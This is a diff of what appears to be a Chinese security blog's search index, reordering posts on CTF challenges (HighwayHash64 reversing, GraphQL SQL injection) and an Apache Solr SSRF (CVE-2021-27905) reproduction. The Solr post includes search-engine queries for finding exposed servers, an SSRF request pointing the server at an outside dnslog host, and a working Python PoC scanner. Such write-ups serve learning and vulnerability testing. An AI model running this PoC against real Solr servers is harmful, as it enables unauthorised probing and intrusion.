@@ -66,136 +66,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Apache Solr SSRF 漏洞(CVE-2021-27905)复现</title>
-    <url>/2021/11/09/Apache%20Solr%20SSRF%20%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h1 id="Apache-Solr-SSRF-漏洞-CVE-2021-27905-复现"><a href="#Apache-Solr-SSRF-漏洞-CVE-2021-27905-复现" class="headerlink" title="Apache Solr SSRF 漏洞(CVE-2021-27905)复现"></a>Apache Solr SSRF 漏洞(CVE-2021-27905)复现</h1><hr>
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><hr>
-<p>Apache Solr是一个开源的搜索服务，使用Java编写、运行在Servlet容器的一个独立的全文搜索服务器，是Apache Lucene项目的开源企业搜索平台。</p>
-<p>该漏洞是由于没有对输入的内容进行校验，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行SSRF攻击，最终造成任意读取服务器上的文件。影响版本为Apache Solr &lt;&#x3D; 8.8.1。</p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="http://archive.apache.org/dist/lucene/solr/8.8.1/">Apache Solr环境下载</a></p>
-<p>![image-20211115202638792](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115202638792.png)</p>
-<p>解压完成后，进入文件夹下的bin目录，在命令行中执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">solr start -p 8983</span><br></pre></td></tr></table></figure>
-
-<p>![image-20211115203019066](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203019066.png)</p>
-<p>在浏览器上访问8983端口，可以看到Solr</p>
-<p>![image-20211115203118220](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203118220.png)</p>
-<p>下面我们为Solr创建Core</p>
-<p>点击左边菜单栏的”Core Admin”选项，创建一个新的Core，发现上方出现报错信息。</p>
-<p>![image-20211115203546935](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203546935.png)</p>
-<p>我们来看下报错信息，如下:</p>
-<p>![image-20211115203923524](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203923524.png)</p>
-<p>提示没找到solrconfig.xml文件在配置文件中。</p>
-<p>我们进入Server文件夹下，可以看到new_core文件夹已经被创建成功。</p>
-<p>![image-20211115204058647](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204058647.png)</p>
-<p>这时，我们只需要把server&#x2F;solr&#x2F;configsets&#x2F;default文件夹下的conf目录整个拷贝到new_core文件夹下，就可以创建Core成功。</p>
-<p>![image-20211115204355418](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204355418.png)</p>
-<p>再次进行创建Core,成功创建</p>
-<p>![image-20211115204436984](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204436984.png)</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>搜索引擎查询</strong></p>
-<p>FOFA查询：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;APACHE-Solr&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>Zoomeye查询:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;APACHE-Solr&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>下面开始对Solr进行漏洞探测.</p>
-<p>通过构造特定的URL访问Solr，可以看到上方创建的Core名字。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/admin/cores?indexInfo=false&amp;wt=json</span><br></pre></td></tr></table></figure>
-
-<p>![image-20211115204811720](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204811720.png)</p>
-<p>solr 支持配置两个core，分别是主(master)和从(slave)，我们可以主动控制让从(slave)去获取主的备份，而master的地址在配置文件可以配置，也允许请求者指定。</p>
-<p>poc格式:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/new_core（上面创建的Core）/replication?command=fetchindex&amp;maste rUrl=http://xxx</span><br></pre></td></tr></table></figure>
-
-
-
-<p>设置URL为DNSlog平台地址，可以看到返回200</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/new_core/replication?command=fetchindex&amp;masterUrl=https://abc.53mliy.dnslog.cn/ss</span><br></pre></td></tr></table></figure>
-
-<p>![image-20211115211804407](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115211804407.png)</p>
-<p>在Dnslog平台上可以看到有请求响应</p>
-<p>![image-20211115211947915](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115211947915.png)</p>
-<p>这里提供一个poc脚本；</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># CVE-2021-27905</span></span><br><span class="line"><span class="comment"># Apache solr ssrf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys, getopt</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">title</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-------------------------------------------------------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------------      Apache Solr SSRF漏洞      ---------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------               CVE-2021-27905               ----------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------use:python3 CVE-2021-27905.py -u url -d dnslog--------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------              Author:Henry4E36            ------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-------------------------------------------------------------]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">commit</span>():</span></span><br><span class="line">    url = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opt, agrs = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">&quot;hu:d:&quot;</span>, [<span class="string">&quot;help&quot;</span>, <span class="string">&quot;url=&quot;</span>,<span class="string">&quot;dnslog=&quot;</span>])</span><br><span class="line">        <span class="keyword">for</span> op, value <span class="keyword">in</span> opt:</span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">&quot;-h&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--help&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            [-]   Apache Solr SSRF漏洞 (CVE-2021-27905)</span></span><br><span class="line"><span class="string">            [-]   Options:</span></span><br><span class="line"><span class="string">                     -h or --help      :   方法说明</span></span><br><span class="line"><span class="string">                     -u or --url       :   站点URL地址</span></span><br><span class="line"><span class="string">                     -d or --dnslog    :   DnsLog</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span>)</span><br><span class="line">                sys.exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&quot;-u&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--url=&quot;</span>:</span><br><span class="line">                url = value</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&quot;-d&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--dnslog=&quot;</span>:</span><br><span class="line">                dnslog = value</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] 参数有误! eg:&gt;&gt;&gt; python3 CVE-2021-27905.py -u http://127.0.0.1 -d dnslog&quot;</span>)</span><br><span class="line">                sys.exit()</span><br><span class="line">        <span class="keyword">return</span> url, dnslog</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 参数有误! eg:&gt;&gt;&gt; python3 CVE-2021-27905.py -u http://127.0.0.1 -d dnslog&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">target_core</span>(<span class="params">url</span>):</span></span><br><span class="line">    target_url = url + <span class="string">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url=target_url,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">5</span>)</span><br><span class="line">        core = <span class="built_in">list</span>(json.loads(res.text)[<span class="string">&quot;status&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> core</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!]  目标系统: <span class="subst">&#123;url&#125;</span> 出现意外！n &quot;</span>,e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssrf</span>(<span class="params">core,dnslog</span>):</span></span><br><span class="line">    target_url = url + <span class="string">f&quot;/solr/<span class="subst">&#123;core&#125;</span>/replication/?command=fetchindex&amp;masterUrl=http://<span class="subst">&#123;dnslog&#125;</span>&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url=target_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        status = json.loads(res.text)[<span class="string">&quot;status&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> status == <span class="string">&quot;OK&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!]  33[31m目标系统: <span class="subst">&#123;url&#125;</span> 可能存在SSRF漏洞，请检查DNSLog响应！33[0m&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[0]  目标系统: <span class="subst">&#123;url&#125;</span> 不存在SSRF漏洞&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!]  目标系统: <span class="subst">&#123;url&#125;</span> 出现意外！n &quot;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    title()</span><br><span class="line">    url ,dnslog = commit()</span><br><span class="line">    core = target_core(url)</span><br><span class="line">    ssrf(core,dnslog)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>使用方法；</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-27905.py -u URL(Solr地址) -d dnslog(dnslog生成地址)</span><br><span class="line"></span><br><span class="line">      -h or --help      :   方法说明</span><br><span class="line">      -u or --url       :   站点URL地址</span><br><span class="line">      -d or --dnslog    :   DnsLog</span><br></pre></td></tr></table></figure>
-
-
-
-<p>我们来运行一下该poc脚本:</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 CVE-<span class="number">2021</span>-<span class="number">27905</span>.py -u http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8983</span> -d otettj.dnslog.cn</span><br></pre></td></tr></table></figure>
-
-<p>提示目标系统可能存在SSRF漏洞</p>
-<p>![image-20211115213537111](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115213537111.png)</p>
-<p>我们查看DNslog平台,有DNS解析记录。</p>
-<p>![image-20211115213646434](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115213646434.png)</p>
-<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>建议受影响的用户升级到最新版本8.8.2</p>
-<p>Apache Solr 8.8.2官方下载地址</p>
-<p><a href="https://solr.apache.org/downloads.html">https://solr.apache.org/downloads.html</a></p>
-]]></content>
-      <categories>
-        <category>Web漏洞</category>
-        <category>Web容器漏洞</category>
-        <category>Apache</category>
-      </categories>
-      <tags>
-        <tag>-web漏洞 -Apache漏洞 -组件漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2022/03/23/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/</url>
-    <content><![CDATA[<p>title: CTF练习-Reverse系列-HighwayHash64<br>date: 2022-04-02 09:56:28<br>tags:<br>      -CTF<br>      -Reverse<br>      -HighwayHash64<br>categories:<br>       [CTF,逆向,HighwayHash64]</p>
-<h1 id="CTF练习-Reverse系列-HighwayHash64"><a href="#CTF练习-Reverse系列-HighwayHash64" class="headerlink" title="CTF练习-Reverse系列-HighwayHash64"></a>CTF练习-Reverse系列-HighwayHash64</h1><p>这道题运用highwayhash64算法，需要爆破hash的题目。程序首先对flag的长度进行hash校验，然后对flag里的数字进行校验，所以首先需要爆破flag长度，然后爆破flag内容。这里有两种方法，一种是修改源码进行源码，另外一种是直接修改exe为dll注入来爆破。</p>
-<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="题目探测"><a href="#题目探测" class="headerlink" title="题目探测"></a>题目探测</h3><p>这道题目所用的附件为一个exe文件，结果如下:</p>
-<p>显示题目描述为: hxb2018{xxxxx}。需要输入一串数字flag，输入其他字符串时提示退出。</p>
-<img src="/2022/03/23/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/image-20220323191950892.png" class title="image-20220323191950892">
-
-
-
-<p>首先判断该程序是否加壳以及程序位数，若经过加壳处理需要通过脱壳处理。</p>
-<img src="/2022/03/23/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/image-20220323192405521.png" class title="image-20220323192405521">
-
-<p>得出该程序为64位未加壳程序</p>
-<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>将程序通过IDA打开该程序,在左边框中找到main主函数，然后按TAB键反汇编获得函数</p>
-<img src="/2022/03/23/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/image-20220401164832157.png" class title="image-20220401164832157">
-
-<p>我们来分析下这个程序流程。</p>
-<p>首先可以得出sub_140001880函数为控制台的输出函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub_140001880(&quot;Please enter flag(Note:hxb2018&#123;digital&#125;:&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>然后通过gets_s()函数从标准的输入中读取数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gets_s(Buffer, 0x104ui64);</span><br><span class="line">//gets_s(words,STLEN);</span><br></pre></td></tr></table></figure>
-
-<p>这里的长度限制为int(‘0x104’,’16’)&#x3D;260，当输入行太长时会丢弃输入行的其余字符，剩余的字符留在缓冲区成为下一读取语句的输入</p>
-<p>接下来查看sub_1400017A0函数，一个应该为输入的字符串，第二个为输入值的长度16进制</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( sub_1400017A0(v7, 4i64) != 0xD31580A28DD8E6C4ui64 )</span><br></pre></td></tr></table></figure>
-
-<p>下面也调用了该函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( sub_1400017A0(&amp;Buffer[8], (unsigned int)v3) != 0xC886BDF39CB4ED72ui64 )</span><br></pre></td></tr></table></figure>
-
-<p>当判断成功时，会输出成功</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub_140001880(&quot;successful!\nplease entry any key exit...&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>大致的意思应该为计算输入字符串进行哈希计算，然后判断是否为0xD31580A28DD8E6C4ui64，经后续判断为HighwayHash64摘要计算。</p>
-<h3 id="题目解答"><a href="#题目解答" class="headerlink" title="题目解答"></a>题目解答</h3><blockquote>
-<p>这里想到的解题思路为调用HighwayHash64算法对输入字符串进行爆破，当计算结果为0xD31580A28DD8E6C4ui64时即可</p>
-</blockquote>
-<p><a href="https://github.com/google/highwayhash">HighwayHash64</a></p>
-<p>这里首先跟进下sub_1400017A0函数，判断是否和HighwayHash64算法一致。</p>
-<img src="/2022/03/23/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/image-20220401182609549.png" class title="image-20220401182609549">
-
-]]></content>
-  </entry>
-  <entry>
     <title>CTF练习-Web系列-SQLI（一）</title>
     <url>/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/</url>
     <content><![CDATA[<h1 id="CTF学习-Web系列（一）-Graphql注入"><a href="#CTF学习-Web系列（一）-Graphql注入" class="headerlink" title="CTF学习-Web系列（一）-Graphql注入"></a>CTF学习-Web系列（一）-Graphql注入</h1><h2 id="靶场地址"><a href="#靶场地址" class="headerlink" title="靶场地址"></a>靶场地址</h2><p><a href="http://10.0.25.109:20080/">http://10.0.25.109:20080/</a></p>
@@ -294,11 +164,63 @@
       </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2022/03/29/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
+    <title>CTF练习-Reverse系列-HighwayHash64</title>
+    <url>/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/</url>
+    <content><![CDATA[<h1 id="CTF练习-Reverse系列-HighwayHash64"><a href="#CTF练习-Reverse系列-HighwayHash64" class="headerlink" title="CTF练习-Reverse系列-HighwayHash64"></a>CTF练习-Reverse系列-HighwayHash64</h1><p>这道题运用highwayhash64算法，需要爆破hash的题目。程序首先对flag的长度进行hash校验，然后对flag里的数字进行校验，所以首先需要爆破flag长度，然后爆破flag内容。这里有两种方法，一种是修改源码进行源码，另外一种是直接修改exe为dll注入来爆破。</p>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="题目探测"><a href="#题目探测" class="headerlink" title="题目探测"></a>题目探测</h3><p>这道题目所用的附件为一个exe文件，结果如下:</p>
+<p>显示题目描述为: hxb2018{xxxxx}。需要输入一串数字flag，输入其他字符串时提示退出。</p>
+<img src="/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/image-20220323191950892.png" class title="image-20220323191950892">
+
+
+
+<p>首先判断该程序是否加壳以及程序位数，若经过加壳处理需要通过脱壳处理。</p>
+<img src="/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/image-20220323192405521.png" class title="image-20220323192405521">
+
+<p>得出该程序为64位未加壳程序</p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>将程序通过IDA打开该程序,在左边框中找到main主函数，然后按TAB键反汇编获得函数</p>
+<img src="/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/image-20220401164832157.png" class title="image-20220401164832157">
+
+<p>我们来分析下这个程序流程。</p>
+<p>首先可以得出sub_140001880函数为控制台的输出函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub_140001880(&quot;Please enter flag(Note:hxb2018&#123;digital&#125;:&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>然后通过gets_s()函数从标准的输入中读取数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gets_s(Buffer, 0x104ui64);</span><br><span class="line">//gets_s(words,STLEN);</span><br></pre></td></tr></table></figure>
+
+<p>这里的长度限制为int(‘0x104’,’16’)&#x3D;260，当输入行太长时会丢弃输入行的其余字符，剩余的字符留在缓冲区成为下一读取语句的输入</p>
+<p>接下来查看sub_1400017A0函数，一个应该为输入的字符串，第二个为输入值的长度16进制</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( sub_1400017A0(v7, 4i64) != 0xD31580A28DD8E6C4ui64 )</span><br></pre></td></tr></table></figure>
+
+<p>下面也调用了该函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if ( sub_1400017A0(&amp;Buffer[8], (unsigned int)v3) != 0xC886BDF39CB4ED72ui64 )</span><br></pre></td></tr></table></figure>
+
+<p>当判断成功时，会输出成功</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub_140001880(&quot;successful!\nplease entry any key exit...&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>大致的意思应该为计算输入字符串进行哈希计算，然后判断是否为0xD31580A28DD8E6C4ui64，经后续判断为HighwayHash64摘要计算。</p>
+<h3 id="题目解答"><a href="#题目解答" class="headerlink" title="题目解答"></a>题目解答</h3><blockquote>
+<p>这里想到的解题思路为调用HighwayHash64算法对输入字符串进行爆破，当计算结果为0xD31580A28DD8E6C4ui64时即可</p>
+</blockquote>
+<p><a href="https://github.com/google/highwayhash">HighwayHash64</a></p>
+<p>这里首先跟进下sub_1400017A0函数，判断是否和HighwayHash64算法一致。</p>
+<img src="/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Reverse%E7%B3%BB%E5%88%97-HighwayHash64/image-20220401182609549.png" class title="image-20220401182609549">
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>逆向</category>
+        <category>HighwayHash64</category>
+      </categories>
+      <tags>
+        <tag>-CTF -Reverse -HighwayHash64</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF练习-Web系列-SQLI（二）</title>
+    <url>/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
     <content><![CDATA[<h1 id="CTF练习-Web系列-SQLI（二）"><a href="#CTF练习-Web系列-SQLI（二）" class="headerlink" title="CTF练习-Web系列-SQLI（二）"></a>CTF练习-Web系列-SQLI（二）</h1><p>infantsql这道题是前一道题的升级版本，只是在前端调用JSEncrpy第三方库利用公钥进行RSA加密id参数。</p>
 <h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h3><p>首先对其搜索框进行注入点探测，可以看到id参数进行了加密</p>
-<img src="/2022/03/29/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%BA%8C%EF%BC%89/image-20220329145503383.png" class title="image-20220329145503383">
+<img src="/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%BA%8C%EF%BC%89/image-20220329145503383.png" class title="image-20220329145503383">
 
 
 
@@ -317,7 +239,7 @@
 
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">getscorewithname(name:&quot;cVlHc25oQ3Y0NGRPV1JEaG56cFBEYWJEZzZqK0VJWjBkdHlnbk9WTU5sQmU4aWVFb3JWekN5clJtb081VFVXT2VWZTBpYjJGUy8va29EZGZSOGJpc0h2UkNJdVJ3bXVKWnVBOUhRTWxKYSs4MS9LR0hiSUpxL0VFY1BqMWFOdFVXbGsrcG9OMzlOL0xrTzBtT1h4T09kanVVVVNPMkZVam9CSnFIRFJrV3VjPQ==&quot;)&#123;</span><br><span class="line">  name</span><br><span class="line">  score</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<img src="/2022/03/29/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%BA%8C%EF%BC%89/image-20220329150800668.png" class title="image-20220329150800668">
+<img src="/2022/04/02/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%BA%8C%EF%BC%89/image-20220329150800668.png" class title="image-20220329150800668">
 
 
 
@@ -330,6 +252,99 @@
 
 <p>得到flag为：flag{Rea1_flag_1s_Me}</p>
 ]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Web</category>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>-CTF -Web -Graphql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache Solr SSRF 漏洞(CVE-2021-27905)复现</title>
+    <url>/2021/11/09/Apache%20Solr%20SSRF%20%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="Apache-Solr-SSRF-漏洞-CVE-2021-27905-复现"><a href="#Apache-Solr-SSRF-漏洞-CVE-2021-27905-复现" class="headerlink" title="Apache Solr SSRF 漏洞(CVE-2021-27905)复现"></a>Apache Solr SSRF 漏洞(CVE-2021-27905)复现</h1><hr>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><hr>
+<p>Apache Solr是一个开源的搜索服务，使用Java编写、运行在Servlet容器的一个独立的全文搜索服务器，是Apache Lucene项目的开源企业搜索平台。</p>
+<p>该漏洞是由于没有对输入的内容进行校验，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行SSRF攻击，最终造成任意读取服务器上的文件。影响版本为Apache Solr &lt;&#x3D; 8.8.1。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="http://archive.apache.org/dist/lucene/solr/8.8.1/">Apache Solr环境下载</a></p>
+<p>![image-20211115202638792](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115202638792.png)</p>
+<p>解压完成后，进入文件夹下的bin目录，在命令行中执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">solr start -p 8983</span><br></pre></td></tr></table></figure>
+
+<p>![image-20211115203019066](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203019066.png)</p>
+<p>在浏览器上访问8983端口，可以看到Solr</p>
+<p>![image-20211115203118220](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203118220.png)</p>
+<p>下面我们为Solr创建Core</p>
+<p>点击左边菜单栏的”Core Admin”选项，创建一个新的Core，发现上方出现报错信息。</p>
+<p>![image-20211115203546935](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203546935.png)</p>
+<p>我们来看下报错信息，如下:</p>
+<p>![image-20211115203923524](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203923524.png)</p>
+<p>提示没找到solrconfig.xml文件在配置文件中。</p>
+<p>我们进入Server文件夹下，可以看到new_core文件夹已经被创建成功。</p>
+<p>![image-20211115204058647](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204058647.png)</p>
+<p>这时，我们只需要把server&#x2F;solr&#x2F;configsets&#x2F;default文件夹下的conf目录整个拷贝到new_core文件夹下，就可以创建Core成功。</p>
+<p>![image-20211115204355418](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204355418.png)</p>
+<p>再次进行创建Core,成功创建</p>
+<p>![image-20211115204436984](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204436984.png)</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>搜索引擎查询</strong></p>
+<p>FOFA查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;APACHE-Solr&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Zoomeye查询:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;APACHE-Solr&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>下面开始对Solr进行漏洞探测.</p>
+<p>通过构造特定的URL访问Solr，可以看到上方创建的Core名字。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/admin/cores?indexInfo=false&amp;wt=json</span><br></pre></td></tr></table></figure>
+
+<p>![image-20211115204811720](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204811720.png)</p>
